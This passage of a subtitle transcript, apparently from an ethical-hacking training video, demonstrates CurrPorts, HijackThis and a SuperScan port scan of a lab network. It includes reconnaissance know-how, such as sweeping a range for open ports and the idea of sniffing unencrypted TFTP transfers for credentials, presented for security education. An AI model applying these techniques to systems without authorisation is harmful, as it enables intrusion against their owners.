the fact that we could see\n\n99\n00:04:48.570 --> 00:04:52.330\nall running processes if we have the right\ncommand issued from the command line.\n\n100\n00:04:52.330 --> 00:04:56.370\nAnd then we also talked about some of\nthe Windows tools that are available today\n\n101\n00:04:56.370 --> 00:04:58.740\nthrough the sysinternals acquisition.\n\n102\n00:04:58.740 --> 00:05:00.684\nAnd through TechNet at Microsoft where,\n\n103\n00:05:00.684 --> 00:05:03.535\nand I think we put that link\nup during the last episode.\n\n104\n00:05:03.535 --> 00:05:06.815\nWhere we talked about all the PStools,\nthe PS list tool, for instance,\n\n105\n00:05:06.815 --> 00:05:11.435\nwhich actually allows us to pull up and\nsee everything running in the system,\n\n106\n00:05:11.435 --> 00:05:13.810\nwhether it's exposed to task manager or\nnot.\n\n107\n00:05:13.810 --> 00:05:18.360\nAnd currports gives us information\nabout running executables, and so,\n\n108\n00:05:18.360 --> 00:05:21.150\nit's gonna show us things\nthat are claiming open ports.\n\n109\n00:05:21.150 --> 00:05:24.310\nAnd we may very well see processes that\nare running that are not available to\n\n110\n00:05:24.310 --> 00:05:25.740\ntask manager here.\n\n111\n00:05:25.740 --> 00:05:29.550\nBut if a process has been stealthed,\nif, in other words, malware's running,\n\n112\n00:05:29.550 --> 00:05:31.700\nmaybe RootKit's running,\nsomething like that.\n\n113\n00:05:31.700 --> 00:05:36.160\nThis tool may very well show it to us\nbecause if it's claiming an open port,\n\n114\n00:05:36.160 --> 00:05:39.170\nit's gonna be shown here on the list\nunless it's taken some pretty\n\n115\n00:05:39.170 --> 00:05:43.540\nsignificant steps to hide itself and maybe\nmask itself as another running process.\n\n116\n00:05:43.540 --> 00:05:47.275\nSo we may see it but not really know\nwhat it is, we may see it as a service\n\n117\n00:05:47.275 --> 00:05:52.250\nhost.exe right as opposed to the actual\nthing, where you've got a million\n\n118\n00:05:52.250 --> 00:05:54.450\nof those those you don't know what\nthe heck is running under there but\n\n119\n00:05:54.450 --> 00:05:57.670\nwhy do we have 10 different servers,\nor 12 different services?\n\n120\n00:05:57.670 --> 00:06:00.450\nWe don't always know what is running but\nthe nice thing about it is that\n\n121\n00:06:00.450 --> 00:06:05.670\na tool like this, and let me just move\nthis out so we can see a little bit.\n\n122\n00:06:05.670 --> 00:06:09.060\nYo if we go down and see the service\nhost items that are running and\n\n123\n00:06:09.060 --> 00:06:14.450\nI'll just scroll down and\nwe will, you see that we have,\n\n124\n00:06:14.450 --> 00:06:17.050\nI don't know,\nliterally 20 of them running there.\n\n125\n00:06:17.050 --> 00:06:20.030\nRight, the first one is\nrunning right there and\n\n126\n00:06:20.030 --> 00:06:22.653\nthe last one is running right there.\n\n127\n00:06:22.653 --> 00:06:27.570\nAll of those are service hosts, but what\nwe'll see is that under local port name so\n\n128\n00:06:27.570 --> 00:06:30.540\nin the fifth column over, right here.\n\n129\n00:06:30.540 --> 00:06:34.760\nWe can see that we have\nlocal ports identified for\n\n130\n00:06:34.760 --> 00:06:37.900\ncertain services that are running\nunder service host, right?\n\n131\n00:06:37.900 --> 00:06:42.540\nSo we have IPsec running there, we have\nisocamp running for our key exchange,\n\n132\n00:06:42.540 --> 00:06:45.250\nright, and\nto do some sort of secure communication.\n\n133\n00:06:45.250 --> 00:06:47.260\nWe've got some NTP running,\n\n134\n00:06:47.260 --> 00:06:51.435\nwe've got S looks like SSDP\nrunning down there as well.\n\n135\n00:06:51.435 --> 00:06:54.235\nWe've got a bunch of that going on and\nwe've got IPv4 and\n\n136\n00:06:54.235 --> 00:06:59.335\nIPv6 happening because we've\ngot our local address area and\n\n137\n00:06:59.335 --> 00:07:02.960\nwe can see that we've got some IPv6\naddresses running there as well.\n\n138\n00:07:02.960 --> 00:07:06.650\nThe nice thing about it is that\nthe tools going to identify for\n\n139\n00:07:06.650 --> 00:07:11.630\nus what the processes are but\nalso give us if there is a port name.\n\n140\n00:07:11.630 --> 00:07:12.220\nSo in other words,\n\n141\n00:07:12.220 --> 00:07:16.560\nif that process is spitting out a name\nit hasn't identified, we can use that.\n\n142\n00:07:16.560 --> 00:07:19.200\nWe're also gonna be able\nto see the protocol,\n\n143\n00:07:19.200 --> 00:07:22.610\nthe process ID what we call the PIN\nwhich is always most important thing for\n\n144\n00:07:22.610 --> 00:07:25.260\nunique identifier in terms of tracking.\n\n145\n00:07:25.260 --> 00:07:27.220\nWe're going to be able to\nsee protocol UDP or TCP.\n\n146\n00:07:27.220 --> 00:07:32.410\nWe had that conversation prior episode of\nconnection oriented versus connectionless.\n\n147\n00:07:32.410 --> 00:07:36.240\nWe got our local port number, local\naddress, lot of it's going to either be\n\n148\n00:07:36.240 --> 00:07:41.390\nloopback or just an address of\nsome kinds being used to map.\n\n149\n00:07:41.390 --> 00:07:44.250\nAnd then we've got if we are doing\na remote connection we may see\n\n150\n00:07:44.250 --> 00:07:46.840\nsome remote information that we can find.\n\n151\n00:07:46.840 --> 00:07:49.550\nWe've got quite a bit of\nstuff as we scroll over.\n\n152\n00:07:49.550 --> 00:07:53.696\nWe've got not just the remote information\nbut we've also got the process path and\n\n153\n00:07:53.696 --> 00:07:56.177\nthis is one of the reasons\nI like a tool like this.\n\n154\n00:07:56.177 --> 00:08:00.378\nBecause again if we've got that malware\nrunning that rootkit you know whatever\n\n155\n00:08:00.378 --> 00:08:02.444\nit may be we're gonna be able to go in and\n\n156\n00:08:02.444 --> 00:08:06.143\nFind where that thing's actually\nkicking off from, trace it back and\n\n157\n00:08:06.143 --> 00:08:09.550\nthen hopefully, if all goes well,\nbe able to drill in, right?\n\n158\n00:08:09.550 --> 00:08:10.730\nAnd try to find that.\n\n159\n00:08:10.730 --> 00:08:12.710\nAnd you can see as I scroll over,\nthere's a little delay, but\n\n160\n00:08:12.710 --> 00:08:16.020\nyou can see, I got company information,\nI got file version.\n\n161\n00:08:16.020 --> 00:08:19.710\nI got username that spawning\nthat process services.\n\n162\n00:08:19.710 --> 00:08:24.040\nSo, I'm looking at the services that\nmaybe running in and or dependent.\n\n163\n00:08:24.040 --> 00:08:25.590\nI've got process attributes.\n\n164\n00:08:26.680 --> 00:08:29.360\nYou had a great deal of information here.\n\n165\n00:08:30.640 --> 00:08:34.120\nAnd as I continue to scroll over,\nlet me just move that over right\n\n166\n00:08:34.120 --> 00:08:37.320\nwe're gonna be able to see some\nadditional stuff going on there and so\n\n167\n00:08:37.320 --> 00:08:38.800\nwe've got quite a bit of information.\n\n168\n00:08:38.800 --> 00:08:43.550\nYou know a tool like this can be very\nvaluable with regards to what it is\n\n169\n00:08:43.550 --> 00:08:46.490\nthat I mean just select single item.\n\n170\n00:08:46.490 --> 00:08:48.430\nWhat it is that we want to be able to see?\n\n171\n00:08:48.430 --> 00:08:51.690\nAnd it also identifies the program and\nthe windows tiles so it tells us,\n\n172\n00:08:51.690 --> 00:08:55.890\nhey, this proxy workbench or\nwhatever is what's running, all right?\n\n173\n00:08:55.890 --> 00:08:59.060\nSo it's good, because it does\ngive us a lot of information.\n\n174\n00:08:59.060 --> 00:09:04.080\nAnd the nice thing about it,\nis that we can go in, and\n\n175\n00:09:04.080 --> 00:09:09.420\nwe can save off the output\nthat we got here so\n\n176\n00:09:09.420 --> 00:09:13.860\nwe can take this information, we can dump\nit into a file for documentation purposes.\n\n177\n00:09:13.860 --> 00:09:16.730\nWe've talked a lot about the fact\nthat it's very important for\n\n178\n00:09:16.730 --> 00:09:21.680\nus to be able to provide, as ethical\nhackers, information to our customer and\n\n179\n00:09:21.680 --> 00:09:23.200\nsay, hey, these are the resources I used.\n\n180\n00:09:23.200 --> 00:09:24.790\nThis is what I find.\n\n181\n00:09:24.790 --> 00:09:28.280\nThese are the things we're recommending\nyou do, so we can save it off.\n\n182\n00:09:28.280 --> 00:09:33.275\nWe can go in and we can,\nas you can see, highlight something,\n\n183\n00:09:33.275 --> 00:09:36.755\nclose the connection or kill processes\nassociated with it from the tool.\n\n184\n00:09:36.755 --> 00:09:40.555\nSo it gives us that task manager\nlike capability, to go in and,\n\n185\n00:09:40.555 --> 00:09:43.195\neither through a brick level select,\ndo one item or\n\n186\n00:09:43.195 --> 00:09:46.510\nkill a tree,\nyou take down the entire chain, right?\n\n187\n00:09:46.510 --> 00:09:49.590\nSo we can look at process properties,\nwe can drill down.\n\n188\n00:09:49.590 --> 00:09:53.020\nSo it's gonna essentially give\nus task manager features, but\n\n189\n00:09:53.020 --> 00:09:54.710\nwith a lot more visibility.\n\n190\n00:09:54.710 --> 00:09:58.040\n>> Right, and the chance that,\n[COUGH] excuse me.\n\n191\n00:09:58.040 --> 00:09:59.160\nIf somebody had written something,\n\n192\n00:09:59.160 --> 00:10:04.140\nnow were to hide from task manager Might\nnot hide from this particular program.\n\n193\n00:10:04.140 --> 00:10:05.920\n>> Might not hide from\nthis particular program.\n\n194\n00:10:05.920 --> 00:10:07.140\nAgain, no guarantees here,\n\n195\n00:10:07.140 --> 00:10:10.400\nthere are rootkits and things that will\nstealth themselves, will only come up for\n\n196\n00:10:10.400 --> 00:10:14.140\nair at certain points in time,\nmay not show up running here.\n\n197\n00:10:14.140 --> 00:10:18.890\nThey may show up, as we said, essentially\ngonna be under a different name.\n\n198\n00:10:18.890 --> 00:10:22.450\nSo look, it's not Mike Rodrick,\nit's actually Johnny Smith, right?\n\n199\n00:10:22.450 --> 00:10:25.770\nAnd we don't think Johnny's a problem,\nso we ignore that.\n\n200\n00:10:25.770 --> 00:10:29.030\nA service host is that category that\ntypically tends to hide a lot of that.\n\n201\n00:10:29.030 --> 00:10:32.810\nYou saw, we got 20 instances running and\nI promise\n\n202\n00:10:32.810 --> 00:10:36.600\nyou not all 20 are legitimate stuff based\non what we're doing in the lab here.\n\n203\n00:10:36.600 --> 00:10:40.140\nSome of that is other stuff we're running\nthat's stealthed in the background.\n\n204\n00:10:40.140 --> 00:10:42.120\nSo, yeah there could be a lot of that.\n\n205\n00:10:42.120 --> 00:10:43.960\nBut this tool will be helpful.\n\n206\n00:10:43.960 --> 00:10:46.740\nI mentioned an oldie but\na goodie as well, Hijack This.\n\n207\n00:10:46.740 --> 00:10:50.168\n>> This is another one of those old but\ngreat tools really designed more for\n\n208\n00:10:50.168 --> 00:10:54.710\nmal-ware removal, mal-ware identification,\nmore so than hacking, perse, but\n\n209\n00:10:54.710 --> 00:10:58.200\nit is a really good tool to use locally\nif you know how to find a copy of it.\n\n210\n00:10:58.200 --> 00:10:59.600\nYou can probably Google it and find it and\n\n211\n00:10:59.600 --> 00:11:01.640\nso it's floating around\nout there somewhere.\n\n212\n00:11:01.640 --> 00:11:05.290\nBut it's good to use, because what\nit will do is on the local machine.\n\n213\n00:11:05.290 --> 00:11:07.850\nAnd remember, part of ethical hacking,\nis not just, how do I go out and\n\n214\n00:11:07.850 --> 00:11:09.700\nfigure what the risks and\nthe weaknesses are.\n\n215\n00:11:09.700 --> 00:11:12.310\nHow do I defend is part of that as well?\n\n216\n00:11:12.310 --> 00:11:15.760\nAnd you may have an instance where\na machine has been compromised, and\n\n217\n00:11:15.760 --> 00:11:20.240\nas the ethical hacker, is kind of\nthe Security expert in your organization\n\n218\n00:11:20.240 --> 00:11:22.330\non offense as well as defense.\n\n219\n00:11:22.330 --> 00:11:24.940\nYou may get the call to come in and\nsay, hey what's going on here.\n\n220\n00:11:24.940 --> 00:11:26.330\nHelp us figure it out.\n\n221\n00:11:26.330 --> 00:11:28.350\nAnd you may have to go in and\nsee what's on that machine.\n\n222\n00:11:28.350 --> 00:11:31.250\nAnd figure out if it's been compromised,\ncuz you're going to have to forensically\n\n223\n00:11:31.250 --> 00:11:33.300\nexamine it to understand\nwhat went wrong so\n\n224\n00:11:33.300 --> 00:11:35.540\nyou can defend against\nthat attack the next time.\n\n225\n00:11:35.540 --> 00:11:37.935\nAnd a tool like Hijack this,\nmay be valuable, and\n\n226\n00:11:37.935 --> 00:11:39.540\nthere are other tools to do this.\n\n227\n00:11:39.540 --> 00:11:42.840\nThis is just one of those\nthat tends to be really good.\n\n228\n00:11:42.840 --> 00:11:46.470\nInstalls and loads and almost\nregardless of what is running in there,\n\n229\n00:11:46.470 --> 00:11:50.940\nit will be able to profile everything and\nthen you'll be able to get a list of what\n\n230\n00:11:50.940 --> 00:11:54.160\nMaybe running, you've got to, again,\nferret out what's good and bad, right?\n\n231\n00:11:54.160 --> 00:11:56.630\nBut ultimately you'll be able to use\na tool like that to be able to go in and\n\n232\n00:11:56.630 --> 00:12:00.180\nfind information about processes\nthat might be stealthed.\n\n233\n00:12:00.180 --> 00:12:04.480\nAnd so it's good when you're building\na baseline on a secure installation\n\n234\n00:12:04.480 --> 00:12:05.970\nto run tools like this,\n\n235\n00:12:05.970 --> 00:12:09.600\nlooking at what's really there after you\nthink you've cleaned the system up and\n\n236\n00:12:09.600 --> 00:12:12.640\nsee whether everything you think is\nthere is actually all that's there.\n\n237\n00:12:12.640 --> 00:12:15.870\nAnd then that will give you a much better\nidea of the kind of stuff that may be\n\n238\n00:12:15.870 --> 00:12:16.600\nrunning under the hood.\n\n239\n00:12:16.600 --> 00:12:19.700\nYou know, a lot of times we have\nthese maintenance pieces of\n\n240\n00:12:19.700 --> 00:12:23.470\nsoftware that are like utilities and\nstuff that vendors put in.\n\n241\n00:12:23.470 --> 00:12:26.320\nDell has it for their servers,\nthings like that.\n\n242\n00:12:26.320 --> 00:12:29.290\nAnd I just call it nuisance ware,\nbecause the routes, its not bad.\n\n243\n00:12:29.290 --> 00:12:30.005\nIts not malware.\n\n244\n00:12:30.005 --> 00:12:31.760\nIts not going to hurt the machine.\n\n245\n00:12:31.760 --> 00:12:34.300\nBut the reality is,\nit's running headless a lot of the time.\n\n246\n00:12:34.300 --> 00:12:35.660\nYou don't see an interface.\n\n247\n00:12:35.660 --> 00:12:38.520\nAnd unless you know it's there,\nyou may not see the process.\n\n248\n00:12:38.520 --> 00:12:39.410\nOr if you see the process,\n\n249\n00:12:39.410 --> 00:12:42.110\nyou may not recognize that\nthat's something you don't want.\n\n250\n00:12:42.110 --> 00:12:44.895\nAnd sure to go in and right-click and\nkilling one process at a time,\n\n251\n00:12:44.895 --> 00:12:47.530\nuntil you take everything down,\nand figure out what it is.\n\n252\n00:12:47.530 --> 00:12:49.525\nI can be hard to clean a machine up.\n\n253\n00:12:49.525 --> 00:12:51.745\nYou go through and\ntake out the obvious stuff but\n\n254\n00:12:51.745 --> 00:12:54.075\nthere's stuff that's running\nthat you just don't see.\n\n255\n00:12:54.075 --> 00:12:58.125\nTools like this have multiple uses and\none of them is it can actually help you\n\n256\n00:12:58.125 --> 00:13:00.505\nto really streamline\nthe profile of that machine.\n\n257\n00:13:00.505 --> 00:13:04.795\nGet rid of all of the stuff that really\ndoesn't belong there, and make sure you're\n\n258\n00:13:04.795 --> 00:13:08.850\nas clean and lean as you can be from\nsecurity perspective as you build.\n\n259\n00:13:08.850 --> 00:13:09.560\nThat profile, and\n\n260\n00:13:09.560 --> 00:13:13.400\nthen try to protect that usage profile\nin that system as you're running it.\n\n261\n00:13:13.400 --> 00:13:14.160\nSo it's just, again,\n\n262\n00:13:14.160 --> 00:13:18.320\nsomething to consider, kind of multiple\nways we're approaching the same problem.\n\n263\n00:13:18.320 --> 00:13:21.260\nI think we do have the URL, or,\nultimately, Mike was able to find\n\n264\n00:13:21.260 --> 00:13:24.460\nthe URL for HiJackThis and\ntools like that in that category.\n\n265\n00:13:24.460 --> 00:13:26.040\nAnd there's a lot of different ones.\n\n266\n00:13:26.040 --> 00:13:28.110\nThere may be ones that\nare specific to certain root kits,\n\n267\n00:13:28.110 --> 00:13:31.490\nto certain pieces of malware, and\nyou may have to get several of them\n\n268\n00:13:31.490 --> 00:13:34.410\nto be able to profile a machine and\nlook for specific things.\n\n269\n00:13:34.410 --> 00:13:37.310\nIt's great when you have an all\nin one tool and hijack this.\n\n270\n00:13:37.310 --> 00:13:39.520\nAt certain points can do almost anything,\nbut\n\n271\n00:13:39.520 --> 00:13:43.120\nthere are newer strains of APTs that may\nnot show up in a tool like that, and they\n\n272\n00:13:43.120 --> 00:13:48.010\nhave their own specific removal pieces or\nremoval software items that you can use.\n\n273\n00:13:48.010 --> 00:13:49.810\nRootkits tend to be problematic.\n\n274\n00:13:49.810 --> 00:13:53.040\nRootkits tend to need to have\ntheir own specific kind of\n\n275\n00:13:53.040 --> 00:13:56.970\nremoval software crafted for them, because\nof the unique nature of how they work.\n\n276\n00:13:56.970 --> 00:13:59.060\nAnd they're not always gonna\nbe found by all in one tools.\n\n277\n00:13:59.060 --> 00:14:02.170\nSo, keep in mind, you may be using\nseveral different pieces of software.\n\n278\n00:14:02.170 --> 00:14:05.890\nYou know, I talked about this\nconcept of having a toolkit, right?\n\n279\n00:14:05.890 --> 00:14:09.980\nOf literally building up a toolkit or\na bench of tools that you would use, or\n\n280\n00:14:09.980 --> 00:14:13.162\na tool box, that the ethical hacker would,\nin a sense, be able to play.\n\n281\n00:14:13.162 --> 00:14:16.360\nYears ago, when I started doing this And\n\n282\n00:14:16.360 --> 00:14:19.666\nwe're talking approximately over\nthree decades at this point.\n\n283\n00:14:19.666 --> 00:14:20.820\n>> [LAUGH]\n>> That I've been doing this.\n\n284\n00:14:20.820 --> 00:14:25.830\nBack in the day,\nyou probably are of the same general\n\n285\n00:14:25.830 --> 00:14:30.250\ntime frame as I am, you may remember I\nwould show up at a client site to do work.\n\n286\n00:14:30.250 --> 00:14:35.000\nI'd have my portfolio, my folder of discs,\nat that point it was floppies.\n\n287\n00:14:35.000 --> 00:14:39.040\nYou had your little black valet pack you'd\ncarry with all your software in it, and\n\n288\n00:14:39.040 --> 00:14:42.600\nI had my floppies, and\nthen it went to CD's and\n\n289\n00:14:42.600 --> 00:14:45.210\nDVD's, and\neventually went to external hard drive.\n\n290\n00:14:45.210 --> 00:14:48.130\nSo then you went to the cloud,\nand everything's available there.\n\n291\n00:14:48.130 --> 00:14:51.570\nAnd it's a progression where we\nfind stuff, but I remember for\n\n292\n00:14:51.570 --> 00:14:53.860\na number of years, just walking around\nwith having those, you know, the bag,\n\n293\n00:14:53.860 --> 00:14:55.690\nthe go-bag with all that stuff in it.\n\n294\n00:14:55.690 --> 00:14:59.060\nThe cables, the connectors,\nthe NetBios drivers,\n\n295\n00:14:59.060 --> 00:15:02.930\nand all the stuff you would need to\nbe able to spin up a machine and\n\n296\n00:15:02.930 --> 00:15:08.100\nbuild and create images for Exchange 5.0,\nand all the stuff we were doing.\n\n297\n00:15:08.100 --> 00:15:09.781\nAnd this is the kind of stuff\nyou'd have to do, and so\n\n298\n00:15:09.781 --> 00:15:11.170\nyou'd carry around a lot of the software.\n\n299\n00:15:11.170 --> 00:15:14.056\nBecause you would have a need for it and\nit wasn't easy to go get and download.\n\n300\n00:15:14.056 --> 00:15:17.592\nA lot of times, it was hard to find and\nyou wouldn't be able to get it because\n\n301\n00:15:17.592 --> 00:15:20.512\na lot of companies would block\naccess to those kinda sites, so\n\n302\n00:15:20.512 --> 00:15:22.275\nyou'd walk around with this stuff.\n\n303\n00:15:22.275 --> 00:15:24.751\nToday, it's, you know,\nsitting out there on source forager.\n\n304\n00:15:24.751 --> 00:15:25.704\n>> Yeah.\n>> You know, wherever, right?\n\n305\n00:15:25.704 --> 00:15:26.530\nIf you can just find it.\n\n306\n00:15:26.530 --> 00:15:28.960\nSo it's a little bit easier\ntoday to do our job.\n\n307\n00:15:28.960 --> 00:15:30.380\nBut then there's new challenges, right?\n\n308\n00:15:30.380 --> 00:15:31.710\nWe have new things that\nwe got to deal with.\n\n309\n00:15:31.710 --> 00:15:32.400\nAnd worry about.\n\n310\n00:15:32.400 --> 00:15:34.070\n>> And probably throw one\ndisclaimer in there too.\n\n311\n00:15:34.070 --> 00:15:35.750\nWhile we're on the subject of tools.\n\n312\n00:15:35.750 --> 00:15:38.260\nMake sure you're getting\nit from a trusted source.\n\n313\n00:15:38.260 --> 00:15:41.530\nNo easier way to infect people.\n\n314\n00:15:41.530 --> 00:15:44.730\nThan to advertise, hey free security\ntools, come download these and\n\n315\n00:15:44.730 --> 00:15:48.162\nrun them on your computer and if you\ndon't know what you should be getting.\n\n316\n00:15:48.162 --> 00:15:50.802\nWhat to look for and\nwho it came from and things like that,\n\n317\n00:15:50.802 --> 00:15:52.630\nyou can very well infect your machine.\n\n318\n00:15:52.630 --> 00:15:53.690\nSo do be careful.\n\n319\n00:15:53.690 --> 00:15:57.394\nDon't just go out and do Free security\ntools and click on the top link and\n\n320\n00:15:57.394 --> 00:15:59.450\nassume everything is going to be safe.\n\n321\n00:15:59.450 --> 00:16:01.060\n>> Remember,\nmama said don't talk to strangers.\n\n322\n00:16:01.060 --> 00:16:01.792\n>> That's right.\n[LAUGH]\n\n323\n00:16:01.792 --> 00:16:03.670\n>> There's a reason for that, right?\n\n324\n00:16:03.670 --> 00:16:04.440\nStranger danger!\n\n325\n00:16:04.440 --> 00:16:05.403\n>> That's it.\n\n326\n00:16:05.403 --> 00:16:06.362\n>> Security tool danger!\n\n327\n00:16:06.362 --> 00:16:07.169\n>> [LAUGH]\n>> All right,\n\n328\n00:16:07.169 --> 00:16:10.480\nlet's go back to the demo machine,\nlet's do a little more show and tell.\n\n329\n00:16:10.480 --> 00:16:12.440\nSo we took a look at curb ports,\nwhat's up next?\n\n330\n00:16:12.440 --> 00:16:13.260\nWhat are we gonna do next?\n\n331\n00:16:13.260 --> 00:16:16.890\n>> Let's see, I have the oldie\ngoody Super Scan version 4.1.\n\n332\n00:16:16.890 --> 00:16:18.140\n>> Okay, Super Scan, all right.\n\n333\n00:16:18.140 --> 00:16:21.010\nSo got Super Scan up and\nrunning right there.\n\n334\n00:16:21.010 --> 00:16:25.170\nWhat we have, and I just went ahead and\nI did the scan on the range cuz these tend\n\n335\n00:16:25.170 --> 00:16:27.960\nto take a little bit of time depending on\nthe number of hosts that are out there.\n\n336\n00:16:27.960 --> 00:16:30.750\nSo we just preloaded the range,\nsame range we've been using for\n\n337\n00:16:30.750 --> 00:16:32.525\nall the demos here at ITProTV.\n\n338\n00:16:32.525 --> 00:16:35.370\nWe got plenty of people running around\nwith machines on all the time, so\n\n339\n00:16:35.370 --> 00:16:37.010\nit's easy to find victims.\n\n340\n00:16:37.010 --> 00:16:37.810\nI don't mean that, I'm sorry.\n\n341\n00:16:37.810 --> 00:16:38.569\n>> Yeah.\n[LAUGH]\n\n342\n00:16:38.569 --> 00:16:39.770\n>> I mean, live machines so\n\n343\n00:16:39.770 --> 00:16:40.490\nwe can look at.\n\n344\n00:16:40.490 --> 00:16:42.132\nSo I got the range up there,\nwe added it in.\n\n345\n00:16:42.132 --> 00:16:43.910\nIf we're gonna do an individual host,\n\n346\n00:16:43.910 --> 00:16:45.884\nwe just plug the individual\nhost right up here.\n\n347\n00:16:45.884 --> 00:16:50.060\nIf we're gonna be doing the range we do\nstart and end IP, pretty straight forward.\n\n348\n00:16:50.060 --> 00:16:51.380\nAnd then we just hit the arrow,\n\n349\n00:16:51.380 --> 00:16:54.340\nthe appropriate arrow to bring it\nover into the box here to set it up.\n\n350\n00:16:54.340 --> 00:16:56.150\nThen we just go ahead and we hit start.\n\n351\n00:16:56.150 --> 00:16:59.290\nThen it runs, kind of does its thing\ndown here, pretty straight forward.\n\n352\n00:16:59.290 --> 00:17:03.730\nWhen it's done, tells us the number\nof live hosts, we found 65.\n\n353\n00:17:03.730 --> 00:17:06.630\nOpen ports, looks like we got\nsome UDP ports sitting there.\n\n354\n00:17:06.630 --> 00:17:09.250\nThe nice thing about\nthis is it goes ahead,\n\n355\n00:17:09.250 --> 00:17:12.820\nit does give us kind of a list of what\nit does and just a running total here.\n\n356\n00:17:12.820 --> 00:17:16.970\nBut we get this nice little\nView HTML Results button down below.\n\n357\n00:17:16.970 --> 00:17:20.190\nAnd so we can click on that,\nwe'll give it a second.\n\n358\n00:17:20.190 --> 00:17:25.370\nIt's gonna bring up a nice little report\nfor us in HTML, tells us what it found.\n\n359\n00:17:25.370 --> 00:17:30.960\nSo it looks like on port, or rather on\n10.1.230.1 gives us two ports there.\n\n360\n00:17:30.960 --> 00:17:35.440\nPort 53 and 123 on UDP, so\nit tells us what's going on.\n\n361\n00:17:35.440 --> 00:17:38.575\nAnd if there's any banners that\nit can grab, it'll grab those.\n\n362\n00:17:38.575 --> 00:17:41.046\nLooks like on 230.2 we got port 69 for\nTFTP,\n\n363\n00:17:41.046 --> 00:17:44.900\nprobably something going on with Cisco I\nwould guess, or something like that.\n\n364\n00:17:44.900 --> 00:17:46.540\nI know\n>> Yeah they're doing that.\n\n365\n00:17:46.540 --> 00:17:50.280\n>> we're doing some Cisco stuff, right,\nso I'm guessing they may be doing or\n\n366\n00:17:50.280 --> 00:17:53.390\nlooking at Cisco Gear and\nmaybe uploading configs, things like that.\n\n367\n00:17:53.390 --> 00:17:54.680\n>> Hey, we could mess with Ronnie's show.\n\n368\n00:17:54.680 --> 00:17:55.960\n>> We could.\n\n369\n00:17:55.960 --> 00:17:56.812\nYou mean like hack?\n\n370\n00:17:56.812 --> 00:17:57.735\n>> Yeah.\n[LAUGH]\n\n371\n00:17:57.735 --> 00:17:58.490\n>> Well\n\n372\n00:17:58.490 --> 00:18:00.100\nthat would only be good if it was ethical.\n\n373\n00:18:00.100 --> 00:18:01.730\n>> That's right,\nI'd need to get Ronnie's permission first.\n\n374\n00:18:01.730 --> 00:18:04.162\n>> Maybe we should go ask him if we can\nblow his machine up before we do that,\n\n375\n00:18:04.162 --> 00:18:05.112\nright?\n\n376\n00:18:05.112 --> 00:18:09.972\n>> So this is the kind of stuff\nthat you would look at and go so\n\n377\n00:18:09.972 --> 00:18:10.530\nTFTP, what is that in my mind, right?\n\n378\n00:18:10.530 --> 00:18:14.390\nBefore Mike and I were just joking around\nabout taking out studio one, right?\n\n379\n00:18:14.390 --> 00:18:15.668\nWe could upgrade and move over there.\n\n380\n00:18:15.668 --> 00:18:17.401\n>> We could. [LAUGH] >> [LAUGH]\nIf we got the sheet offline,\n\n381\n00:18:17.401 --> 00:18:18.660\nthat might not be a bad thing.\n\n382\n00:18:18.660 --> 00:18:22.280\n>> Megan, close your ears, you're not\nhearing anything for just a minute, right?\n\n383\n00:18:22.280 --> 00:18:23.050\nI know nothing.\n\n384\n00:18:23.050 --> 00:18:25.385\nI swear I never heard them say\nanything about doing that.\n\n385\n00:18:25.385 --> 00:18:25.886\n>> [LAUGH]\n>> So,\n\n386\n00:18:25.886 --> 00:18:28.154\nwhat you would look at as\nan ethical hacker right,\n\n387\n00:18:28.154 --> 00:18:31.082\nwould be a list like this and\nsay well what is TFTP used for right.\n\n388\n00:18:31.082 --> 00:18:33.516\nI mean in my mind I'm thinking\nthat's an unusual protocol,\n\n389\n00:18:33.516 --> 00:18:34.720\nwhy am I seeing that, right?\n\n390\n00:18:34.720 --> 00:18:35.420\n>> Right.\n>> Well,\n\n391\n00:18:35.420 --> 00:18:38.980\nI know that that's associated\ntraditionally with Cisco or\n\n392\n00:18:38.980 --> 00:18:39.930\nany kind of networking gear.\n\n393\n00:18:39.930 --> 00:18:43.590\nNot just Cisco but I know it's used to\nupload config files, I know it's used\n\n394\n00:18:43.590 --> 00:18:47.200\nto remotely connect to and manage machines\nif we're gonna upload and download.\n\n395\n00:18:47.200 --> 00:18:48.960\nSo, I'm thinking something\nlike that's going on.\n\n396\n00:18:48.960 --> 00:18:51.490\nIn my mind I'm making a mental\nnote that's a machine and\n\n397\n00:18:51.490 --> 00:18:53.110\nan interface I wanna look at.\n\n398\n00:18:53.110 --> 00:18:55.360\nThere's probably information there\nthat will be valuable to me.\n\n399\n00:18:55.360 --> 00:18:57.870\n>> Right.\n>> Maybe I can monitor through a Wireshark\n\n400\n00:18:57.870 --> 00:19:01.800\nup and start looking at packet transfers,\nand maybe I'm gonna get config files.\n\n401\n00:19:01.800 --> 00:19:05.040\nAnd maybe, if that person's not smart\nabout encrypting that transfer,\n\n402\n00:19:05.040 --> 00:19:07.830\nmaybe I'm gonna get usernames and\npasswords when they log in, right?\n\n403\n00:19:07.830 --> 00:19:10.710\nSo I may be able to get a lot of\ninformation just by recognizing\n\n404\n00:19:10.710 --> 00:19:12.340\none port running on one machine.\n\n405\n00:19:12.340 --> 00:19:13.240\n>> Wow.\n\n406\n00:19:13.240 --> 00:19:14.440\n>> Think about that, right.\n\n407\n00:19:14.440 --> 00:19:17.225\nOr I could just be making it all up as\nI go and there's nothing there at all.\n\n408\n00:19:17.225 --> 00:19:18.750\n>> [LAUGH]\n>> That could also be the case,\n\n409\n00:19:18.750 --> 00:19:21.750\nbecause Lord knows I'm known\nto do that from time to time.\n\n410\n00:19:21.750 --> 00:19:26.170\nSo I see if I continue down,\nI see NTP running on several machines.\n\n411\n00:19:26.170 --> 00:19:29.470\nI notice it's not running on all of them,\nbut I do notice it's running on some.\n\n412\n00:19:29.470 --> 00:19:32.960\nAnother interesting observation I may\nbe able to make as a hacker, ethical or\n\n413\n00:19:32.960 --> 00:19:34.171\notherwise, right?\n\n414\n00:19:34.171 --> 00:19:36.370\nWhy is NTP running on some and\nnot on others?\n\n415\n00:19:36.370 --> 00:19:40.210\nWell we know what NTP does, right, it's\ngonna be used for time synchronization.\n\n416\n00:19:40.210 --> 00:19:43.020\nSo we know that if we've got domain\nbased machines that have to log in and\n\n417\n00:19:43.020 --> 00:19:46.080\nauthenticate that they\ndefinitely are gonna need NTP.\n\n418\n00:19:46.080 --> 00:19:48.410\nSo maybe that is an NTP server.\n\n419\n00:19:48.410 --> 00:19:52.710\nSo, and/or maybe NTP has the services\nrunning there to keep them synced up.\n\n420\n00:19:52.710 --> 00:19:56.070\nSo maybe that's a piece of information\nI could file away and use later, right?\n\n421\n00:19:56.070 --> 00:19:59.210\nMaybe I now know that there's\nmaybe an LDAP directory.\n\n422\n00:19:59.210 --> 00:20:03.185\nSo maybe, if 